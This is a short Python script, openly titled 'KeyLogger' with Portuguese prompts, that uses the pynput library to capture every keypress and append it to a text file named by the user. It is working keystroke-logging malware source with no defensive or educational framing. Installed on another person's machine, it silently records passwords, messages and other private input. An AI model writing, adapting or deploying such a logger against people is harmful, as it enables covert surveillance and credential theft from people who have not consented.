from pynput.keyboard import Listener
import pyfiglet as pg
from rich import print
import os
import re

limpar = 'cls' if os.name == 'nt' else 'clear'
os.system(limpar)

banner = pg.figlet_format('KeyLogger')
print(banner)
print('[red]OBS:[/] [italic]Feche o terminal toda vez que finalizar o processo para salvar as teclas capituradas[/]\n')

qq = input('Digite o nome do arquivo: ')

def KeyLogger(tecla):
	tecla = str(tecla)
	tecla = re.sub(r'\'','', tecla)
	tecla = re.sub(r'Key.space',' ', tecla)
	tecla = re.sub(r'Key.enter','\n', tecla)

	with open(f'{qq}.txt', 'a') as Keys:
		print(f'{tecla}', file=Keys)

with Listener(on_press=KeyLogger) as k:
	k.join()
